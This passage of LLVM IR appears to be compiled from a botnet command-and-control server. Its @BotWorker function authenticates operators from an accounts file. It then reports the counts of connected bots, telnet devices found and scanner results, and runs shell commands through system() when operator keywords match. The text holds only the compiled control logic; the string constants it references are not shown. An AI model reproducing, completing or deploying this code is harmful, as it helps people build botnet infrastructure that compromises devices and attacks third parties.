  %10 = zext i1 %not. to i32
  %.09. = add nsw i32 %10, %.0914
  %.0..011 = select i1 %9, i32 %.015, i32 %.01113
  %11 = add nuw nsw i32 %.01113, 1
  %12 = call i8* @fgets(i8* nonnull %5, i32 512, %struct._IO_FILE* nonnull %3)
  %13 = icmp eq i8* %12, null
  br i1 %13, label %.loopexit.loopexit, label %.lr.ph

.loopexit.loopexit:                               ; preds = %.lr.ph
  %phitmp = icmp eq i32 %.09., 0
  %phitmp17 = select i1 %phitmp, i32 0, i32 %.0..011
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader
  %.09.lcssa = phi i32 [ 0, %.preheader ], [ %phitmp17, %.loopexit.loopexit ]
  %14 = call i32 @fclose(%struct._IO_FILE* nonnull %3)
  br label %15

; <label>:15:                                     ; preds = %.loopexit, %1
  %.012 = phi i32 [ -1, %1 ], [ %.09.lcssa, %.loopexit ]
  ret i32 %.012
}

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #3

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define noalias i8* @BotWorker(i8*) #0 {
  %2 = alloca i64, align 8
  %3 = alloca [2048 x i8], align 16
  %4 = alloca [2048 x i8], align 16
  %5 = alloca [2048 x i8], align 16
  %6 = alloca [80 x i8], align 16
  %7 = alloca [5000 x i8], align 16
  %8 = alloca [5000 x i8], align 16
  %9 = alloca [5000 x i8], align 16
  %10 = alloca [5000 x i8], align 16
  %11 = alloca [5000 x i8], align 16
  %12 = alloca [5000 x i8], align 16
  %13 = alloca [5000 x i8], align 16
  %14 = alloca [80 x i8], align 16
  %15 = alloca [2048 x i8], align 16
  %16 = alloca [80 x i8], align 16
  %17 = alloca [80 x i8], align 16
  %18 = alloca [80 x i8], align 16
  %19 = alloca [80 x i8], align 16
  %20 = alloca [80 x i8], align 16
  %21 = alloca [80 x i8], align 16
  %22 = alloca [80 x i8], align 16
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  %25 = alloca [80 x i8], align 16
  %26 = alloca [80 x i8], align 16
  %27 = alloca [80 x i8], align 16
  %28 = alloca [80 x i8], align 16
  %29 = alloca [80 x i8], align 16
  %30 = alloca [80 x i8], align 16
  %31 = alloca [80 x i8], align 16
  %32 = alloca [80 x i8], align 16
  %33 = alloca [80 x i8], align 16
  %34 = alloca [80 x i8], align 16
  %35 = alloca [80 x i8], align 16
  %36 = alloca [80 x i8], align 16
  %37 = alloca [80 x i8], align 16
  %38 = alloca [80 x i8], align 16
  %39 = alloca [80 x i8], align 16
  %40 = alloca [80 x i8], align 16
  %41 = alloca [2048 x i8], align 16
  %42 = alloca [2048 x i8], align 16
  %43 = alloca [2048 x i8], align 16
  %44 = alloca i64, align 8
  %45 = alloca [50 x i8], align 16
  %46 = ptrtoint i8* %0 to i64
  %47 = trunc i64 %46 to i32
  %48 = load volatile i32, i32* @OperatorsConnected, align 4
  %49 = add nsw i32 %48, 1
  store volatile i32 %49, i32* @OperatorsConnected, align 4
  %50 = getelementptr inbounds [2048 x i8], [2048 x i8]* %3, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %50, i8 0, i64 2048, i32 16, i1 false)
  %51 = getelementptr inbounds [2048 x i8], [2048 x i8]* %4, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %51, i8 0, i64 2048, i32 16, i1 false)
  %52 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %52, i8 0, i64 2048, i32 16, i1 false)
  %53 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  %54 = tail call i32 @feof(%struct._IO_FILE* %53) #10
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %.lr.ph138.preheader, label %._crit_edge139.thread

.lr.ph138.preheader:                              ; preds = %1
  br label %.lr.ph138

._crit_edge139.thread:                            ; preds = %1
  tail call void @rewind(%struct._IO_FILE* %53)
  br label %.lr.ph135.preheader

.lr.ph138:                                        ; preds = %.lr.ph138.preheader, %.lr.ph138
  %.092136 = phi i32 [ %57, %.lr.ph138 ], [ 0, %.lr.ph138.preheader ]
  %56 = tail call i32 @fgetc(%struct._IO_FILE* %53)
  %57 = add nuw nsw i32 %.092136, 1
  %58 = tail call i32 @feof(%struct._IO_FILE* %53) #10
  %59 = icmp eq i32 %58, 0
  br i1 %59, label %.lr.ph138, label %._crit_edge139

._crit_edge139:                                   ; preds = %.lr.ph138
  tail call void @rewind(%struct._IO_FILE* %53)
  %60 = icmp eq i32 %.092136, 0
  br i1 %60, label %._crit_edge, label %.lr.ph135.preheader

.lr.ph135.preheader:                              ; preds = %._crit_edge139.thread, %._crit_edge139
  %61 = phi i32 [ -1, %._crit_edge139.thread ], [ %.092136, %._crit_edge139 ]
  %wide.trip.count = zext i32 %61 to i64
  br label %.lr.ph135

.lr.ph135:                                        ; preds = %.lr.ph135.preheader, %.lr.ph135
  %indvars.iv = phi i64 [ 0, %.lr.ph135.preheader ], [ %indvars.iv.next, %.lr.ph135 ]
  %62 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %indvars.iv, i32 0, i64 0
  %63 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %indvars.iv, i32 1, i64 0
  %64 = tail call i32 (%struct._IO_FILE*, i8*, ...) @__isoc99_fscanf(%struct._IO_FILE* %53, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.20, i64 0, i64 0), i8* %62, i8* %63) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph135

._crit_edge.loopexit:                             ; preds = %.lr.ph135
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge139
  %65 = tail call i64 @send(i32 %47, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.21, i64 0, i64 0), i64 22, i32 16384) #10
  %66 = icmp eq i64 %65, -1
  br i1 %66, label %.loopexit, label %67

; <label>:67:                                     ; preds = %._crit_edge
  %68 = call i32 @fdgets(i8* nonnull %50, i32 2048, i32 %47)
  %69 = icmp slt i32 %68, 1
  br i1 %69, label %.loopexit, label %70

; <label>:70:                                     ; preds = %67
  call void @trim(i8* nonnull %50)
  %71 = call i32 (i8*, i8*, ...) @sprintf(i8* getelementptr inbounds ([10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 0, i32 0, i64 0), i8* nonnull %50) #10
  %72 = call i32 @Find_Login(i8* nonnull %50)
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %73, i32 0, i64 0
  %75 = call i32 @strcmp(i8* nonnull %50, i8* %74) #9
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %105

; <label>:77:                                     ; preds = %70
  %78 = tail call i64 @send(i32 %47, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.23, i64 0, i64 0), i64 22, i32 16384) #10
  %79 = icmp eq i64 %78, -1
  br i1 %79, label %.loopexit, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @fdgets(i8* nonnull %50, i32 2048, i32 %47)
  %82 = icmp slt i32 %81, 1
  br i1 %82, label %.loopexit, label %83

; <label>:83:                                     ; preds = %80
  call void @trim(i8* nonnull %50)
  %84 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %73, i32 1, i64 0
  %85 = call i32 @strcmp(i8* nonnull %50, i8* %84) #9
  %86 = icmp eq i32 %85, 0
  br i1 %86, label %87, label %105

; <label>:87:                                     ; preds = %83
  call void @llvm.memset.p0i8.i64(i8* nonnull %50, i8 0, i64 2048, i32 16, i1 false)
  %88 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %89 = getelementptr inbounds [2048 x i8], [2048 x i8]* %15, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %89, i8 0, i64 2048, i32 16, i1 false)
  %90 = getelementptr inbounds [5000 x i8], [5000 x i8]* %7, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %90, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.26, i64 0, i64 0), i64 107, i32 1, i1 false)
  %91 = getelementptr inbounds [5000 x i8], [5000 x i8]* %8, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %91, i8* getelementptr inbounds ([97 x i8], [97 x i8]* @.str.27, i64 0, i64 0), i64 97, i32 1, i1 false)
  %92 = getelementptr inbounds [5000 x i8], [5000 x i8]* %9, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %92, i8* getelementptr inbounds ([99 x i8], [99 x i8]* @.str.28, i64 0, i64 0), i64 99, i32 1, i1 false)
  %93 = getelementptr inbounds [5000 x i8], [5000 x i8]* %10, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %93, i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.29, i64 0, i64 0), i64 85, i32 1, i1 false)
  %94 = getelementptr inbounds [5000 x i8], [5000 x i8]* %11, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %94, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.30, i64 0, i64 0), i64 89, i32 1, i1 false)
  %95 = getelementptr inbounds [5000 x i8], [5000 x i8]* %12, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %95, i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.31, i64 0, i64 0), i64 81, i32 1, i1 false)
  %96 = getelementptr inbounds [5000 x i8], [5000 x i8]* %13, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %96, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.32, i64 0, i64 0), i64 71, i32 1, i1 false)
  %97 = getelementptr inbounds [80 x i8], [80 x i8]* %14, i64 0, i64 0
  %98 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %97, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.33, i64 0, i64 0), i8* %74) #10
  %99 = call i32 @BotsConnected()
  %100 = load volatile i32, i32* @OperatorsConnected, align 4
  %101 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %89, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.34, i64 0, i64 0), i32 %99, i32 %100) #10
  %102 = call i64 @strlen(i8* nonnull %90) #9
  %103 = call i64 @send(i32 %47, i8* nonnull %90, i64 %102, i32 16384) #10
  %104 = icmp eq i64 %103, -1
  br i1 %104, label %.loopexit, label %115

; <label>:105:                                    ; preds = %83, %70
  %106 = tail call i64 @send(i32 %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.24, i64 0, i64 0), i64 5, i32 16384) #10
  %107 = icmp eq i64 %106, -1
  br i1 %107, label %.loopexit, label %108

; <label>:108:                                    ; preds = %105
  %109 = getelementptr inbounds [80 x i8], [80 x i8]* %6, i64 0, i64 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %109, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.25, i64 0, i64 0), i64 28, i32 1, i1 false)
  %110 = call i64 @strlen(i8* nonnull %109) #9
  %111 = call i64 @send(i32 %47, i8* nonnull %109, i64 %110, i32 16384) #10
  %112 = icmp eq i64 %111, -1
  br i1 %112, label %.loopexit, label %113

; <label>:113:                                    ; preds = %108
  %114 = call i32 @sleep(i32 5) #10
  br label %.loopexit

; <label>:115:                                    ; preds = %87
  %116 = call i64 @strlen(i8* nonnull %91) #9
  %117 = call i64 @send(i32 %47, i8* nonnull %91, i64 %116, i32 16384) #10
  %118 = icmp eq i64 %117, -1
  br i1 %118, label %.loopexit, label %119

; <label>:119:                                    ; preds = %115
  %120 = call i64 @strlen(i8* nonnull %92) #9
  %121 = call i64 @send(i32 %47, i8* nonnull %92, i64 %120, i32 16384) #10
  %122 = icmp eq i64 %121, -1
  br i1 %122, label %.loopexit, label %123

; <label>:123:                                    ; preds = %119
  %124 = call i64 @strlen(i8* nonnull %93) #9
  %125 = call i64 @send(i32 %47, i8* nonnull %93, i64 %124, i32 16384) #10
  %126 = icmp eq i64 %125, -1
  br i1 %126, label %.loopexit, label %127

; <label>:127:                                    ; preds = %123
  %128 = call i64 @strlen(i8* nonnull %94) #9
  %129 = call i64 @send(i32 %47, i8* nonnull %94, i64 %128, i32 16384) #10
  %130 = icmp eq i64 %129, -1
  br i1 %130, label %.loopexit, label %131

; <label>:131:                                    ; preds = %127
  %132 = call i64 @strlen(i8* nonnull %95) #9
  %133 = call i64 @send(i32 %47, i8* nonnull %95, i64 %132, i32 16384) #10
  %134 = icmp eq i64 %133, -1
  br i1 %134, label %.loopexit, label %135

; <label>:135:                                    ; preds = %131
  %136 = call i64 @strlen(i8* nonnull %96) #9
  %137 = call i64 @send(i32 %47, i8* nonnull %96, i64 %136, i32 16384) #10
  %138 = icmp eq i64 %137, -1
  br i1 %138, label %.loopexit, label %139

; <label>:139:                                    ; preds = %135
  %140 = call i64 @strlen(i8* nonnull %97) #9
  %141 = call i64 @send(i32 %47, i8* nonnull %97, i64 %140, i32 16384) #10
  %142 = icmp eq i64 %141, -1
  br i1 %142, label %.loopexit, label %143

; <label>:143:                                    ; preds = %139
  %144 = call i64 @strlen(i8* nonnull %89) #9
  %145 = call i64 @send(i32 %47, i8* nonnull %89, i64 %144, i32 16384) #10
  %146 = icmp eq i64 %145, -1
  br i1 %146, label %.loopexit, label %147

; <label>:147:                                    ; preds = %143
  %148 = call i64 @send(i32 %47, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.35, i64 0, i64 0), i64 12, i32 16384) #10
  %149 = icmp eq i64 %148, -1
  br i1 %149, label %.loopexit, label %150

; <label>:150:                                    ; preds = %147
  %151 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  %sext94 = shl i64 %46, 32
  %152 = ashr exact i64 %sext94, 32
  %153 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %152, i32 0
  store i32 1, i32* %153, align 4
  %154 = call i32 @fdgets(i8* nonnull %50, i32 2048, i32 %47)
  %155 = icmp sgt i32 %154, 0
  br i1 %155, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %150
  %156 = getelementptr inbounds [50 x i8], [50 x i8]* %45, i64 0, i64 0
  %157 = getelementptr inbounds [2048 x i8], [2048 x i8]* %42, i64 0, i64 0
  %158 = getelementptr inbounds [2048 x i8], [2048 x i8]* %41, i64 0, i64 0
  %159 = getelementptr inbounds [80 x i8], [80 x i8]* %16, i64 0, i64 0
  %160 = getelementptr inbounds [80 x i8], [80 x i8]* %17, i64 0, i64 0
  %161 = getelementptr inbounds [80 x i8], [80 x i8]* %18, i64 0, i64 0
  %162 = getelementptr inbounds [80 x i8], [80 x i8]* %19, i64 0, i64 0
  %163 = getelementptr inbounds [80 x i8], [80 x i8]* %20, i64 0, i64 0
  %164 = getelementptr inbounds [80 x i8], [80 x i8]* %21, i64 0, i64 0
  %165 = getelementptr inbounds [80 x i8], [80 x i8]* %22, i64 0, i64 0
  %166 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i64 0, i64 0
  %167 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i64 0, i64 0
  %168 = getelementptr inbounds [80 x i8], [80 x i8]* %25, i64 0, i64 0
  %169 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %170 = getelementptr inbounds [80 x i8], [80 x i8]* %27, i64 0, i64 0
  %171 = getelementptr inbounds [80 x i8], [80 x i8]* %28, i64 0, i64 0
  %172 = getelementptr inbounds [80 x i8], [80 x i8]* %29, i64 0, i64 0
  %173 = getelementptr inbounds [80 x i8], [80 x i8]* %30, i64 0, i64 0
  %174 = getelementptr inbounds [80 x i8], [80 x i8]* %31, i64 0, i64 0
  %175 = getelementptr inbounds [80 x i8], [80 x i8]* %32, i64 0, i64 0
  %176 = getelementptr inbounds [80 x i8], [80 x i8]* %33, i64 0, i64 0
  %177 = getelementptr inbounds [80 x i8], [80 x i8]* %34, i64 0, i64 0
  %178 = getelementptr inbounds [80 x i8], [80 x i8]* %35, i64 0, i64 0
  %179 = getelementptr inbounds [80 x i8], [80 x i8]* %36, i64 0, i64 0
  %180 = getelementptr inbounds [80 x i8], [80 x i8]* %37, i64 0, i64 0
  %181 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %182 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %183 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %184 = getelementptr inbounds [2048 x i8], [2048 x i8]* %42, i64 0, i64 11
  %185 = getelementptr inbounds [2048 x i8], [2048 x i8]* %41, i64 0, i64 14
  br label %186

; <label>:186:                                    ; preds = %.lr.ph, %.backedge
  %187 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0)) #9
  %188 = icmp eq i8* %187, null
  br i1 %188, label %196, label %189

; <label>:189:                                    ; preds = %186
  %190 = call i32 @BotsConnected()
  %191 = load volatile i32, i32* @OperatorsConnected, align 4
  %192 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %51, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i64 0, i64 0), i32 %190, i32 %191) #10
  %193 = call i64 @strlen(i8* nonnull %51) #9
  %194 = call i64 @send(i32 %47, i8* nonnull %51, i64 %193, i32 16384) #10
  %195 = icmp eq i64 %194, -1
  br i1 %195, label %.loopexit95.loopexit, label %.backedge

; <label>:196:                                    ; preds = %186
  %197 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.38, i64 0, i64 0)) #9
  %198 = icmp eq i8* %197, null
  br i1 %198, label %206, label %199

; <label>:199:                                    ; preds = %196
  %200 = load volatile i32, i32* @TELFound, align 4
  %201 = load volatile i32, i32* @scannerreport, align 4
  %202 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %52, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i64 0, i64 0), i32 %200, i32 %201) #10
  %203 = call i64 @strlen(i8* nonnull %52) #9
  %204 = call i64 @send(i32 %47, i8* nonnull %52, i64 %203, i32 16384) #10
  %205 = icmp eq i64 %204, -1
  br i1 %205, label %.loopexit95.loopexit, label %.backedge

; <label>:206:                                    ; preds = %196
  %207 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i64 0, i64 0)) #9
  %208 = icmp eq i8* %207, null
  br i1 %208, label %223, label %209

; <label>:209:                                    ; preds = %206
  %210 = call i32 @BotsConnected()
  %211 = load volatile i32, i32* @OperatorsConnected, align 4
  %212 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %51, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.37, i64 0, i64 0), i32 %210, i32 %211) #10
  %213 = call i64 @strlen(i8* nonnull %51) #9
  %214 = call i64 @send(i32 %47, i8* nonnull %51, i64 %213, i32 16384) #10
  %215 = icmp eq i64 %214, -1
  br i1 %215, label %.loopexit95.loopexit, label %216

; <label>:216:                                    ; preds = %209
  %217 = load volatile i32, i32* @TELFound, align 4
  %218 = load volatile i32, i32* @scannerreport, align 4
  %219 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %52, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.39, i64 0, i64 0), i32 %217, i32 %218) #10
  %220 = call i64 @strlen(i8* nonnull %52) #9
  %221 = call i64 @send(i32 %47, i8* nonnull %52, i64 %220, i32 16384) #10
  %222 = icmp eq i64 %221, -1
  br i1 %222, label %.loopexit95.loopexit, label %.backedge

; <label>:223:                                    ; preds = %206
  %224 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i64 0, i64 0)) #9
  %225 = icmp eq i8* %224, null
  br i1 %225, label %230, label %226

; <label>:226:                                    ; preds = %223
  %227 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.42, i64 0, i64 0)) #10
  br label %.backedge

.backedge:                                        ; preds = %226, %233, %238, %243, %248, %253, %258, %263, %268, %273, %278, %283, %288, %293, %298, %404, %476, %189, %199, %216, %409, %456, %473
  %228 = call i32 @fdgets(i8* nonnull %50, i32 2048, i32 %47)
  %229 = icmp sgt i32 %228, 0
  br i1 %229, label %186, label %.loopexit.loopexit

; <label>:230:                                    ; preds = %223
  %231 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0)) #9
  %232 = icmp eq i8* %231, null
  br i1 %232, label %235, label %233

; <label>:233:                                    ; preds = %230
  %234 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.44, i64 0, i64 0)) #10
  br label %.backedge

; <label>:235:                                    ; preds = %230
  %236 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i64 0, i64 0)) #9
  %237 = icmp eq i8* %236, null
  br i1 %237, label %240, label %238

; <label>:238:                                    ; preds = %235
  %239 = call i32 @system(i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.46, i64 0, i64 0)) #10
  br label %.backedge

; <label>:240:                                    ; preds = %235
  %241 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0)) #9
  %242 = icmp eq i8* %241, null
  br i1 %242, label %245, label %243

; <label>:243:                                    ; preds = %240
  %244 = call i32 @system(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.48, i64 0, i64 0)) #10
  br label %.backedge

; <label>:245:                                    ; preds = %240
  %246 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.49, i64 0, i64 0)) #9
  %247 = icmp eq i8* %246, null
  br i1 %247, label %250, label %248

; <label>:248:                                    ; preds = %245
  %249 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.50, i64 0, i64 0)) #10
  br label %.backedge

; <label>:250:                                    ; preds = %245
  %251 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.51, i64 0, i64 0)) #9
  %252 = icmp eq i8* %251, null
  br i1 %252, label %255, label %253

; <label>:253:                                    ; preds = %250
  %254 = call i32 @system(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.52, i64 0, i64 0)) #10
  br label %.backedge

; <label>:255:                                    ; preds = %250
  %256 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.53, i64 0, i64 0)) #9
  %257 = icmp eq i8* %256, null
  br i1 %257, label %260, label %258

; <label>:258:                                    ; preds = %255
  %259 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.54, i64 0, i64 0)) #10
  br label %.backedge

; <label>:260:                                    ; preds = %255
  %261 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i64 0, i64 0)) #9
  %262 = icmp eq i8* %261, null
  br i1 %262, label %265, label %263

; <label>:263:                                    ; preds = %260
  %264 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.56, i64 0, i64 0)) #10
  br label %.backedge

; <label>:265:                                    ; preds = %260
  %266 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.57, i64 0, i64 0)) #9
  %267 = icmp eq i8* %266, null
  br i1 %267, label %270, label %268

; <label>:268:                                    ; preds = %265
  %269 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.58, i64 0, i64 0)) #10
  br label %.backedge

; <label>:270:                                    ; preds = %265
  %271 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i64 0, i64 0)) #9
  %272 = icmp eq i8* %271, null
  br i1 %272, label %275, label %273

; <label>:273:                                    ; preds = %270
  %274 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.60, i64 0, i64 0)) #10
  br label %.backedge

; <label>:275:                                    ; preds = %270
  %276 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i64 0, i64 0)) #9
  %277 = icmp eq i8* %276, null
  br i1 %277, label %280, label %278

; <label>:278:                                    ; preds = %275
  %279 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.62, i64 0, i64 0)) #10
  br label %.backedge

; <label>:280:                                    ; preds = %275
  %281 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.63, i64 0, i64 0)) #9
  %282 = icmp eq i8* %281, null
  br i1 %282, label %285, label %283

; <label>:283:                                    ; preds = %280
  %284 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.64, i64 0, i64 0)) #10
  br label %.backedge

; <label>:285:                                    ; preds = %280
  %286 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.65, i64 0, i64 0)) #9
  %287 = icmp eq i8* %286, null
  br i1 %287, label %290, label %288

; <label>:288:                                    ; preds = %285
  %289 = call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.66, i64 0, i64 0)) #10
  br label %.backedge

; <label>:290:                                    ; preds = %285
  %291 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.67, i64 0, i64 0)) #9
  %292 = icmp eq i8* %291, null
  br i1 %292, label %295, label %293

; <label>:293:                                    ; preds = %290
  %294 = call i32 @system(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.68, i64 0, i64 0)) #10
  br label %.backedge

; <label>:295:                                    ; preds = %290
  %296 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.69, i64 0, i64 0)) #9
  %297 = icmp eq i8* %296, null
  br i1 %297, label %300, label %298

; <label>:298:                                    ; preds = %295
  %299 = call i32 @system(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.70, i64 0, i64 0)) #10
  br label %.backedge

; <label>:300:                                    ; preds = %295
  %301 = call i8* @strstr(i8* nonnull %50, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.71, i64 0, i64 0)) #9
  %302 = icmp eq i8* %301, null
  br i1 %302, label %406, label %303

; <label>:303:                                    ; preds = %300
  %304 = call i32 @pthread_create(i64* nonnull %2, %union.pthread_attr_t* null, i8* (i8*)* nonnull @TitleWriter, i8* %0) #10
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %159, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.72, i64 0, i64 0), i64 29, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %160, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.73, i64 0, i64 0), i64 62, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %161, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.74, i64 0, i64 0), i64 66, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %162, i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.75, i64 0, i64 0), i64 54, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %163, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.76, i64 0, i64 0), i64 48, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %164, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.77, i64 0, i64 0), i64 56, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %165, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.78, i64 0, i64 0), i64 56, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %166, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.79, i64 0, i64 0), i64 50, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %167, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.80, i64 0, i64 0), i64 29, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %168, i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.81, i64 0, i64 0), i64 36, i32 1, i1 false)
